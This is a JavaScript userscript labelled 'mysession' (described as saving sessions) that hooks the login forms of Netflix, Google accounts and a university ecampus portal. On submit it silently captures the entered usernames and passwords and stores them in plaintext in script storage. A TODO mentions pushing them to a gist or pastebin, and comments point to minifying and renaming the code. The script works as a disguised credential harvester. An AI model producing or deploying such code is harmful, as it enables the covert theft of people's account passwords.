// ==UserScript==
// @name        mysession
// @description	salvar sessões.
// @namespace   http://pastebin.com/EGAuDuhr
// @include     *://www.netflix.com/*Login*
// @include     *://ecampus.ufam.edu.br/ecampus/home/login*
// @include     *://accounts.google.com/ServiceLogin*
// @include     *://accounts.google.com/*signin*
// @version     0.23-1
// @require	https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js
// @grant       GM_setValue
// ==/UserScript==
/*
→ Netflix
→ Gmail
→ Ecampus
*/

//TODO adicionar/criar a gist/pastebin
(function($) {
	String.prototype.isNotEmpty = function() { return (this.trim()); };
	Array.prototype.isNotEmpty  = function() { return (this.length > 0); };
	Array.prototype.toString = function(){ return this.join('|'); }

	// (c) http://www.w3schools.com/jquery/jquery_ref_selectors.asp
	var loginSelectors = 'input[type=email], input[type=text], input[name=login], input[name^=email], input[name=usuario]';
	var psswdSelectors = 'input[type=password], input[name=password], input[name=senha]';

	var getDataAsArray = function(docTarget, selectorsTarget) {
		var nodeListForm = docTarget.querySelectorAll(selectorsTarget);
		var dataArray = [];
		// (c) https://css-tricks.com/snippets/javascript/loop-queryselectorall-matches/
		[].forEach.call(nodeListForm, function(item){
			var e = item.value;
			if(e.isNotEmpty()) dataArray.push(e);
		});
		return dataArray;
	};

	document.querySelector('form').addEventListener('submit', function (e) {
		// e.preventDefault();
		const login_arr = getDataAsArray(this, loginSelectors);
		const passw_arr = getDataAsArray(this, psswdSelectors);

		if((login_arr.isNotEmpty()) && (passw_arr.isNotEmpty())){
			var newData = {
				hst: location.host,
				dte: new Date().toLocaleString(),
				psw: passw_arr.toString()
			};
			GM_setValue(login_arr.toString(), newData);
		}

	});
})(jQuery);


/*********************
$ node
> const s = require('./soundex');
> var valores = [ 'loginSelectors', 'psswdSelectors', 'getDataAsArray', 'docTarget', 'selectorsTarget', 'nodeListForm', 'dataArray', 'login_arr', 'passw_arr', 'newData' ]
> for(var i=0; i < valores.length; ++i) console.log(valores[i]+':'+s.soundex(valores[i]));
loginSelectors:L252
psswdSelectors:P232
getDataAsArray:G332
docTarget:D236
selectorsTarget:S423
nodeListForm:N342
dataArray:D360
login_arr:L256
passw_arr:P260
newData:N330
/*********************/

// http://chris.photobooks.com/json/
// https://javascript-minifier.com/
